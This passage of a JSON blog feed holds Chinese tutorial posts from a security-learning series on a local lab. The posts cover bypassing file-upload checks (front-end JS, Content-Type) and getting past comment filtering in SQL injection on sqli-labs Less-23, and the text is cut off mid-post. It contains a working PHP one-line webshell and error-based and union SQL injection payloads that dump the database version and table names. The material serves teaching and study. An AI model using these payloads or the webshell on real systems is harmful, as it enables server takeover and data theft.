string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span> 文件的 <span class=\"token constant\">MIME</span> 类型，需要浏览器提供该信息的支持，例如<span class=\"token string double-quoted-string\">\"image/gif\"</span>。 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span> 已上传文件的大小，单位为字节。 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span> 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php<span class=\"token operator\">.</span>ini的upload_tmp_dir 指定，但用<span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数设置是不起作用的。 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span> 和该文件上传相关的错误代码。<span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span> 是在 <span class=\"token constant\">PHP</span> <span class=\"token number\">4.2</span><span class=\"token number\">.0</span> 版本中增加的。下面是它的说明：<span class=\"token punctuation\">(</span>它们在<span class=\"token constant\">PHP3</span><span class=\"token number\">.0</span>以后成了常量<span class=\"token punctuation\">)</span></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li>\n<p>定义一个 img_path 变量，接收 UPLOAD_PATH+’/’+upload_file 关联信息中 name 字段的值</p>\n<ul>\n<li><code>['name']</code>  是表示 <code>文件&quot;在上传者机器上&quot;的文件名</code>  ，或者叫 <code>客户端文件的原名称</code></li>\n</ul>\n</li>\n<li>\n<p>判断 <code>move_uploaded_file</code>  的返回值，其函数原型为 <code>move_uploaded_file( string file, string dest)</code> ，意为 <code>将上传的file移动到dest</code></p>\n<ul>\n<li>如果临时文件 <code>$temp_file</code>  成功移动到 <code>$img_path</code>  当中【<strong>相当于 linux 的 mv 指令</strong>】，那么就令 <code>$is_upload</code>  为 <code>true</code> ，并返回 &quot;上传 Success！&quot;</li>\n<li>如果没有移动成功，则返回 “上传出错！”</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"content-type绕过\"><a class=\"markdownIt-Anchor\" href=\"#content-type绕过\">#</a> content-type 绕过</h2>\n<p>抓包后将 <code>Content-type字段的值</code> 修改为 <code>image/jpeg</code> 、 <code>image/png</code> 、 <code>image/gif</code>  的任何一种即可实现绕过。</p>\n<p><img src=\"image-20221003144019576.png\" alt=\"image-20221003144019576\"></p>\n<p>修改如下</p>\n<p><img src=\"image-20221003144200588.png\" alt=\"image-20221003144200588\"></p>\n<p><strong>点击 Forward，提示 &quot;上传 Success！&quot;</strong></p>\n<p><img src=\"image-20221003144223909.png\" alt=\"image-20221003144223909\"></p>\n<p>至此，content-type 验证审计 + 绕过演示完毕。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%89%8D%E5%8F%B0JS%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%89%8D%E5%8F%B0JS%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "title": "前台JS验证审计+绕过",
            "date_published": "2022-10-02T16:34:47.000Z",
            "content_html": "<h1 id=\"文件上传漏洞\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞\">#</a> 文件上传漏洞</h1>\n<p>在讲前台 JS 绕过之前，由于是文件上传漏洞探究系列的第一讲，先来简单介绍一下文件上传漏洞。</p>\n<h2 id=\"文件上传漏洞的原因\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞的原因\">#</a> 文件上传漏洞的原因</h2>\n<ul>\n<li>对于上传文件的后缀名 (扩展名) 没有做较为严格的限制</li>\n<li>对于上传文件的 MIMETYPE (content-type，用于描述文件类型的一种描述方法)，没有做检查</li>\n<li>权限上没有对于上传的文件目录设置不可执行权限</li>\n<li>web server 对于上传文件或者指定目录的行为没有做限制。</li>\n</ul>\n<p>​\t在 Web 中进行文件上传的原理是通过将表单设置为 <code>multipart/form-data</code> ，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段（<strong>multipart</strong>）的数据信息，并将其中的文件内容提取出来并保存。</p>\n<p>​\t通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名（为了防止重复），并且加上原始文件的扩展名来保存到服务器上。</p>\n<h2 id=\"文件上传漏洞的危害\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞的危害\">#</a> 文件上传漏洞的危害</h2>\n<ul>\n<li>上传 web 木马文件、控制 web 服务器文件、远程命令执行等</li>\n<li>上传系统病毒、木马文件进行挖矿、僵尸网络</li>\n<li>上传系统溢出程序进行权限提升</li>\n<li>修改 web 页面实现钓鱼、挂马、暗链等操作</li>\n<li>内网渗透</li>\n<li>在权限得到提升的情况下，想做什么就做什么</li>\n</ul>\n<h2 id=\"文件上传合法性检测方法\"><a class=\"markdownIt-Anchor\" href=\"#文件上传合法性检测方法\">#</a> 文件上传合法性检测方法</h2>\n<ul>\n<li>前端 Js 验证</li>\n<li>MIME 类型验证</li>\n<li>黑名单 / 白名单</li>\n<li>检查文件内容 (getimagesize () 函数用于获取图像信息、校验关键字)</li>\n<li>禁止本地文件包含漏洞</li>\n<li>使用安全的 web 服务 (Apache、nginx (/test.png/xxx.php)、IIS 解析漏洞 (1.php;jpg))</li>\n</ul>\n<h2 id=\"文件上传漏洞8种常见绕过方法\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞8种常见绕过方法\">#</a> 文件上传漏洞 8 种常见绕过方法</h2>\n<p>（整体会有 20 多种，这里列举常见 8 种）</p>\n<ul>\n<li>前端 Js 绕过</li>\n<li>MIME 类型绕过</li>\n<li>后缀名大小写绕过 /php4、php5</li>\n<li>00 截断</li>\n<li>覆盖.htaccess</li>\n<li>Windows 文件流特性绕过</li>\n<li>双写文件名绕过</li>\n<li>条件竞争</li>\n</ul>\n<h2 id=\"文件下载漏洞概念\"><a class=\"markdownIt-Anchor\" href=\"#文件下载漏洞概念\">#</a> 文件下载漏洞概念</h2>\n<ul>\n<li>一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</li>\n<li>下载服务器任意文件，如脚本代码、服务及系统配置文件等可用得到的代码进一步做代码审计，得到更多可利用漏洞。</li>\n</ul>\n<h2 id=\"如何查找任意文件下载漏洞呢\"><a class=\"markdownIt-Anchor\" href=\"#如何查找任意文件下载漏洞呢\">#</a> 如何查找任意文件下载漏洞呢？</h2>\n<p>查找传入文件名的参数：</p>\n<ul>\n<li>导入文件等参数，要是直接输入文件名，就有可能有注入点。</li>\n</ul>\n<p>注意如下几个参数名：</p>\n<ul>\n<li>RealPath, FilePath, filepath, Path, path, inputFile, url, urls, Lang, dis, data, readfile, filep</li>\n<li>src, menu, META-INF, WEB-INF</li>\n</ul>\n<p>代码中如何查找漏洞：</p>\n<p>PHP 为例，有如下代码，就有可能存在任意文件下载漏洞</p>\n<ul>\n<li>readfile</li>\n<li>fopen</li>\n<li>file_get_contents</li>\n</ul>\n<h2 id=\"windows敏感文件路径\"><a class=\"markdownIt-Anchor\" href=\"#windows敏感文件路径\">#</a> Windows 敏感文件路径</h2>\n<p><img src=\"image-20221003011837881.png\" alt=\"image-20221003011837881\"></p>\n<h2 id=\"linux敏感文件路径\"><a class=\"markdownIt-Anchor\" href=\"#linux敏感文件路径\">#</a> Linux 敏感文件路径</h2>\n<p><img src=\"image-20221003011901170.png\" alt=\"image-20221003011901170\"></p>\n<h2 id=\"修复文件下载漏洞\"><a class=\"markdownIt-Anchor\" href=\"#修复文件下载漏洞\">#</a> 修复文件下载漏洞</h2>\n<p>PHP 为例：</p>\n<ul>\n<li>过滤.(点)，使用户在 url 种不能回溯上级目录</li>\n<li>正则严格判断用户输入参数的格式</li>\n<li>php.ini 配置 open_basedir 限定文件访问范围</li>\n</ul>\n<p>OK，进入主题</p>\n<h1 id=\"配置虚拟主机\"><a class=\"markdownIt-Anchor\" href=\"#配置虚拟主机\">#</a> 配置虚拟主机</h1>\n<p>虚拟主机，能够将我们的多个 apache 做成域名的方式访问。</p>\n<p>打开 phpStudyB\\Apache\\conf\\httpd.conf 文件，一共修改两处：</p>\n<ul>\n<li>取消 LoadModule 关于 vhost_alias 的注释</li>\n</ul>\n<p><img src=\"image-20221003113249079.png\" alt=\"image-20221003113249079\"></p>\n<ul>\n<li>取消 Virtual hosts 的 Include 所在行注释</li>\n</ul>\n<p><img src=\"image-20221003113333330.png\" alt=\"image-20221003113333330\"></p>\n<p>再打开 C:\\phpStudyB\\Apache\\conf\\extra\\httpd-vhosts.conf 文件</p>\n<p><img src=\"image-20221003113809255.png\" alt=\"image-20221003113809255\"></p>\n<p>接下来就是重启 phpStudy 就行了。</p>\n<h1 id=\"一句话木马\"><a class=\"markdownIt-Anchor\" href=\"#一句话木马\">#</a> 一句话木马</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[abcd]);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>简而言之，就是只有一句代码的木马。@eval 就是执行一些传的参数命令，$_POST 接收我们的 POST 请求，参数的名称是 abcd。总之，就是可以 <code>执行</code> 我们发送的带参数的命令请求。</p>\n<p>功能是实现：数据库管理、生成虚拟终端、文件管理。</p>\n<h1 id=\"前台js验证审计绕过\"><a class=\"markdownIt-Anchor\" href=\"#前台js验证审计绕过\">#</a> 前台 JS 验证审计 + 绕过</h1>\n<h2 id=\"前台js验证审计\"><a class=\"markdownIt-Anchor\" href=\"#前台js验证审计\">#</a> 前台 Js 验证审计</h2>\n<p>上传 backdoor.php (含有一句话木马)</p>\n<p><img src=\"image-20221003124200976.png\" alt=\"image-20221003124200976\"></p>\n<p>ok，我们开始抓包</p>\n<p>启动 BurpSuit，intercept on，结果再次点击上传按钮，却没有抓到任何的包</p>\n<p>我们 F12 看源码进行代码审计</p>\n<h3 id=\"上传按钮代码审计\"><a class=\"markdownIt-Anchor\" href=\"#上传按钮代码审计\">#</a> 上传按钮代码审计</h3>\n<p>首先我们知道，重要的上传逻辑肯定在这些字样的附近：</p>\n<p><img src=\"image-20221003124524219.png\" alt=\"image-20221003124524219\"></p>\n<p>那么我们找到 &quot;<strong> 上传区</strong> &quot;、&quot;<strong> 请选择要上传的图片</strong> &quot; 这个字样，就能精准定位到相关源码附近。</p>\n<p><img src=\"image-20221003124332517.png\" alt=\"image-20221003124332517\"></p>\n<p>上面一段代码的主要逻辑：</p>\n<ul>\n<li>\n<p>属于 <code>form</code>  数据，使用 <code>POST</code>  请求</p>\n</li>\n<li>\n<p>有<strong>两个</strong>输入 <code>input</code> ：</p>\n<ul>\n<li>\n<p>一个是 input_file，类型是 <code>file</code> ，命名为 upload_file，意为待上传的文件。</p>\n</li>\n<li>\n<p>一个是 button，类型是 <code>submit</code> ，命名为 submit，按钮名称为 “上传”</p>\n</li>\n</ul>\n</li>\n<li>\n<p><code>form</code>  请求在点击 submit 时<strong>会触发的方法</strong> —— <code>onsubmit</code></p>\n<ul>\n<li>return checkFile ()：属于 <code>JavaScript(简称Js)</code>  语法，意为将会调用 <code>checkFile()</code> ，并将其结果返回</li>\n<li><code>onsubmit</code>  就是在提交之前<strong>验证上传文件的合法性，属于前端验证</strong></li>\n</ul>\n</li>\n</ul>\n<p>好的，继续来看一下关键的 <code>checkFile()</code>  函数都干了什么：</p>\n<p><img src=\"image-20221003125613717.png\" alt=\"image-20221003125613717\"></p>\n<p><strong>checkFile () 函数主要逻辑：</strong></p>\n<ul>\n<li>\n<p>通过 <code>getElementsByName()</code>  函数，参数为 <code>upload_file</code>  来获取其数组中第一个元素值 (下标从 0 开始)—— 也就是<strong> upload_file 对应的文件</strong>。</p>\n</li>\n<li>\n<p>如果 <code>upload_file对应的文件</code> 为空，那么就弹出 &quot;请选择要上传的文件！&quot;</p>\n</li>\n<li>\n<p>如果非空，则继续往下走</p>\n<ul>\n<li>定义了允许上传的文件类型为 “.jpg| .png| .gif”</li>\n</ul>\n</li>\n<li>\n<p>通过 lastIndexOf 函数获取 <code>最后一个.</code>  出现的位置进行截取字符串，获得的是 <code>最后一个.</code>  右边的字符串 ——<strong> 获得上传文件后缀名</strong></p>\n</li>\n<li>\n<p>判断 <code>上传文件后缀名</code> 是否在刚刚定义的类型里面</p>\n<ul>\n<li>如果不在则弹出 “该文件不允许上传…”，并 return  <code>false</code></li>\n<li>否则 return  <code>true</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"前台js验证绕过\"><a class=\"markdownIt-Anchor\" href=\"#前台js验证绕过\">#</a> 前台 Js 验证绕过</h2>\n<p>我们再次刷新上传页面，使用 BurpSuit 抓到页面返回的源码信息</p>\n<p><img src=\"image-20221003130553004.png\" alt=\"image-20221003130553004\"></p>\n<p>直接找到刚刚定位的 checkFile () 函数，将其内容改成 <code>return true;</code> ，意为<strong>无论什么文件，恒返回真</strong>。</p>\n<p><img src=\"image-20221003130644011.png\" alt=\"image-20221003130644011\"></p>\n<p>点击 &quot;Forward&quot; 按钮。</p>\n<p>然后上传我们的一句话木马，backdoor.php，点击 “上传”，之后就可以成功抓到包。</p>\n<p><img src=\"image-20221003130804344.png\" alt=\"image-20221003130804344\"></p>\n<p>之后一顿 Forward，提交过去。</p>\n<p>显示了我们上传的 php，即上传成功。</p>\n<p><img src=\"image-20221003130947145.png\" alt=\"image-20221003130947145\"></p>\n<p>我们使用中国菜刀连接获取 webshell 即可。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/",
            "url": "https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/",
            "title": "SQL注入防御",
            "date_published": "2022-10-02T16:01:22.000Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"c641acdafe8c664ad9c22d562811bf3eb712359f6c21c7f85b498d5d308214e1\">881d2a9d793d5558f4c5d7fc62042411cf78789d816c07caf10e349ab53763fc4406ac6aa8d29d42cadd709c9846848edc3ac8104b0a2aee2c589cb45a26d3d8b178130e12ad9309ce4576c62702a0acc5c5e0b2c404d7e4b61c4c97f4993f633823e83e93d4ffc19aec520e686b2b6b50ac5c2af583e8e5cea2dca26beef6e9d43e30cd5dba5681515560b65f29d028540c9afca386cb49bf2836dabbf17da15fe87d476fd265f53d877e4d01fd752763b21295d9881af287630fb6106cb80aa6bf01669d6e858c8f7ea7c57cfd480cae54afcc3200a38624701c979b4328fe806ec968b963706cbe3a08e55034f135c65bda6ee4575dbcd0c554d54b4c3abc340028339080bbd58d716b6c55689531128b2ef7e8761cc8d5898a71d974a5dbc2b13b717805d70287c03d2b0b68b1238e822799f64e1333e136ef072a8ef074268b088e21678143520c90a2c931ee162b74f5217d08504be80104a541b6bd6b670428c2e266186dff210f6a11a5475a0567258f88c3edef9ce229885949776934d62bf3f26eae0f797b9ba41ada122c70cc8527f7acb6706817d2ec6ffa19ddb65aec9c747b7f98b8d88a85cb534971c04213b718114e7e39192778c30faf28e7ee9038d4c62881b83a6e22a72eb7a28f6c1181752ef5b3506466994f63ddb9383bfdbaffb65ff89664e8bd1a96311f414f708bcaed8759bd9021f79358ffc85eda6188cade79fc557c1980336aa70aaedccf18517edd9d9219a60ecfa718153dc0d5caaa6f2fc796056a5ed2477ae8fc7c5f54e7e70b33c1ddaf8499073ca6336440d009e42ff4e69db6fa353c640fc1735e6bd2071417e18721556ba441d7065363ec54d2fa0636e120c54d225eada7cfe8ec2267230ea312614e307433ed71bdb90533dd4ce4aa2032d8f924423f93ab40a221801b3e60c557897c5a2a97843ba0889c913bddaee1a794538bbb93dec7e83df8378efb02551f41b965841f59d38f46481e9d60d37eca9ed33dfcbecd282dde7c89a4217b81df6bc162802b251b031516f0b73e137750e8f32710649731d00cbe84a3ae4f9340d93f2cd993764d26e23a1ef9c471919cd697b7671da0a2e7f5f68af0a4849384a9ee54f9fa426a63265e623bf3f18ceeef37e3521e3ec2e73394cac5fbade500888bb94d95a8a10cffe2770af1ddf3c9df804d0dc1411808d280b2f68700c3cd9495b5824b630baa112075d5ff3a3e5a4684b3b4519fd2605f41aa5a6448796683aa1fa9ed83521618ca375b8b0a7742b482ca59cd9ae520e5c80e615ca1239d574fd78ee6b05dad11545fa2afdae53a630d8dc84c1ca07ad6ec2d48f1e7ed649fd77ee9caca192997059406cc314201f435c1eb3edced4f274e97a3a8dae2a379ba0f2245892a0d307a8d0231aa313c7b46aab5167a97bd7b8dff8d7a39a032468b923a473553d4ec2706cebef7b6980e5d262345172eb783ff2a561803d0e6fdddbb5b150fa14f57f3f1db7c1a17020a53df9edf64626952f3a9745e674eebb54e958077e76228b9d80954514486068de20a84f3409e6745ef7e38d9d4777e489958c07b34d9628b0ceb0e1da5792743895c749fa9092f788305f4693c38fe3a428ee596bfa0a0b2ed5361d276f2dd3b011a386c58b65491e7a93cdf86b0435b7ccd8faed5cd96e459092de94a8a173ee21b813915327597209dddc67ecd183b8795d4e0d89bde81989f37282d51701c9288c5b2693bf42ea6c7712f33ab6eeeccb7c9566366abdcfdf98d8b7b220befcc90acc2998ff48087f1c6353e7a0b97641d572afe6c137064f322303ed9aa6360e96e85f3ab7d37b9323ebd05dd3851d449e2acd01b98f32930849edeee57b930d51d958a939669fd3f633ff9b6717854f6a8f01c5dcc64682c8ae567d1c6617ccd957db555e2570a2d079a0fc8ec6206cc52231fe72f14d77863ff8a2552271d16cf52bc51c868214f71dc014fe4484d959cc170b0b3b99c60847135e54d1fccea31f492c301bd6e02c2697a4e7bf905815a0471fdc2972844092df19bbb8ba4a6a9824d5532a5bad5dd9676cea0ef98dac0a6b4292052e53a3fd6ec22812cb4fe730ac0ed0d00b7570eaf765c5cb86f6221455081150a6cff7bbb63b53cba09cfdd4b9932255e24cb7dc94a5c8e4cd92cb063dfe464513c842c328dd7afe5591501781d5e6139d6d68ac4ea7d29a138f0f7f238998082912ced5f043376695afc2cf2281b13344b363c654fa34da77a64d63e62f9b6738e34e31fd308b2098caba1022b448e57025ce02f73ec4d591be1a3f17f1207ef91fa6f77a1418902d8611c5ad0270738e612dfa397123d089af5c400129a6fb37e50ba754164b4b2ad55f269762d6bac82bf698bc9bd883709bfcc106f95c07fd3eb4bce2e96684c647ed2a4868860e10bf4112911a31d237586eb2207cd8fc3e33458bd7e2ee65f63f7d262f67e74ce66055ba3be73923518202a1fc913ebd9beb2035edecafb2d6e1a2a02b0b23e51ce0af962043c9ecf3cd08e97907ed2a5b45e76361bd112d12e51610b399fe363f30eec8481ba53321741419c6c3da5035910193a68b60fedcc257874099aa56379c6b8509b1718348db8f2e96424031c6598b51078d220d6f957445ceca6e8d847b23c8a5b345c06ffaf43e931d5fd5504ae54a14a031344123f676c4c0e625819688e632b8e70e6f625fbcfead20b1fe7152e224d01b1282a5a6198138de5be5a3b0c5d255e949c97e8ed7fb02c937724129b097ac9f79b2d1d9082c0964f2fc8be9daa035c2a7c607a0ec150c4d51b51dde416c312141f6e9d6d8116dd712dfae8ea4d90aa9addeb469f4f75fe4e6deb1c952972be2510b9993dc60556e1e1e57f267483a12326db9158583ca65094f3fd93d8bd9097ed4a4927ce5c135664d57518ec289e5b95936fe52f0e72d1e21e4b47e03b8ff79bc9e2cfe7b60661e1334da4ae42be99c1dfbfb48bf15ef5cc64503f54ee7e986421fbea9b11c3f09e229b68a761c8b81be49162e738e4901cf30b12e2682ff2f1250e7ea4f53988b8379fd6ba8ced73a37c32236e80b95bc2516028bb09743438cf5c70607198f052806921324d19054807dcd2b61e1063a01a2bc5eb7ad004b13a716f65ace7b4ddc3ed25841597d12e7bad9b233dad078aea6538a8dbd89a50047a3157a6c8330249e579a39fe61551c3eaaac09539e6199d9fe06542736d7014edddb81318265cacb53ba3ec959ceeb94cad9f4e6a6497efabbb8f87e045f7ac04d83f058b4ef9106ca5077d5e4a2c20a62f4b7466e51e811ba6fccfbb27a76a6ff2d2c5b3ec917a833bd18d867447ed155bdffba150d8366c029fd1df9077308c83c7af6aacbd4ef338cf29033972c3e6146d0086728a5d84f5fbd0cf4b53f01b0e4d9b393fefbc20145be6b8db09ad3e95281257649eeb8ecb863bcd4d4b9a639104522b26f6c9847ca826e9aa1685e37e5b0bc9c2d222f9ff572aba51eb3d1c9eb66c8c592aa3ad1dd911bfdb12c8defe86d678dabcdd559fcea118fdab703e1e7f47e4d5f45e8159104f17cb16c74fe3eb86976cc29435a59c31f859b3bd41359ea3e80a51c9e8d127c840af65c061ccdf69270bbe3ee702d1c97db573c7774b6477dae86ea95bf58987700dde4c90db155f0b97d21504839ce30d9ee306949ca4c28c335c83e2609695c3b5c05ec49077deeda534a67fda734eb799d8a66ed0fa</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-wave\">\n      <input class=\"hbe hbe-input-field hbe-input-field-wave\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-wave\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-wave\">Hey, password is required here.</span>\n      </label>\n      <svg class=\"hbe hbe-graphic hbe-graphic-wave\" width=\"300%\" height=\"100%\" viewBox=\"0 0 1200 60\" preserveAspectRatio=\"none\">\n        <path d=\"M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0\"></path>\n      </svg>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/",
            "url": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/",
            "title": "绕过注入防御技巧",
            "date_published": "2022-10-02T15:16:31.000Z",
            "content_html": "<h1 id=\"绕过各种注入防御\"><a class=\"markdownIt-Anchor\" href=\"#绕过各种注入防御\">#</a> 绕过各种注入防御</h1>\n<p>下面介绍几个绕过注入防御的知识：</p>\n<h2 id=\"绕过注释符过滤\"><a class=\"markdownIt-Anchor\" href=\"#绕过注释符过滤\">#</a> 绕过注释符过滤</h2>\n<p>常见注释符有： <code>#</code> 、 <code>%23</code> 、 <code>--+</code></p>\n<p>Less-23 为例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002134327907.png\" alt=\"image-20221002134327907\"></p>\n<p>做以下尝试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; %23</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">3.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; %23 a</span><br><span class=\"line\">报错，syntax to use near &#x27;a&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">4.</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;&quot; %23 a</span><br><span class=\"line\">syntax to use near &#x27;&quot; a&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>根据第三、第四次的结果来看</p>\n<p><code>1' %23 a</code>   —&gt;  <code>a' LIMIT 0,1</code></p>\n<p><code>1'&quot; %23 a</code>  —&gt;  <code>&quot; a' LIMIT 0,1</code></p>\n<p>共同的特性是<strong>输入的字母 a 保留，%23 被过滤</strong></p>\n<p>那 <code>#</code> 和 <code>--+</code>  呢？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;&quot; # a</span><br><span class=\"line\">报错，syntax to use near &#x27;&quot; &#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;&quot; --+ a</span><br><span class=\"line\">报错，syntax to use near &#x27;&quot; a&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>因此，有理由怀疑 ——<strong> 注释符被后台彻底过滤</strong>。</p>\n<p>我们来根据报错语句猜想一下后台语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from xxxx where id = &#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过方式一\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式一\">#</a> 绕过方式一</h3>\n<p>我们可以尝试加一个 <code>单引号</code>  + <code>等号</code>  + <code>单引号</code> ：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from xxxx where id = &#x27;1 &#x27;=&#x27; &#x27; limit 0,1</span><br></pre></td></tr></table></figure>\n<p><code>'='</code>  即为我们的注入语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27;=&#x27;</span><br><span class=\"line\">Your Login name:Angelina</span><br><span class=\"line\">Your Password:I-kill-you</span><br></pre></td></tr></table></figure>\n<p>成功查询，不报错。但是使用 <code>'='</code>  的话，我们没地方可插入一些想要的查询语句</p>\n<p>我们需要换一个思路</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; or 1 or &#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>那么可以使用 <code>布尔注入</code>  +  <code>报错注入</code> 结合，替换两个 <code>or</code>  中间的那个 <code>1</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; or (select extractvalue(1,concat(0x7e,version(),0x7e))) or &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002140115121.png\" alt=\"image-20221002140115121\"></p>\n<p>接下来就可以愉快地爆出数据库名、表、列、值等信息。</p>\n<p>以爆出列名为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; or (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))) or &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002140341257.png\" alt=\"image-20221002140341257\"></p>\n<h3 id=\"绕过方式二\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式二\">#</a> 绕过方式二</h3>\n<p>其实，我们也可以通过闭合前后的单引号，中间使用 union 来做操作</p>\n<p><code>注意</code> ：后面单引号引领着一个列，所以 union select 的包含的列需要把后面的单引号内容考虑进来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#两个列</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; union select 1, &#x27;</span><br><span class=\"line\">报错，The used SELECT statements have a 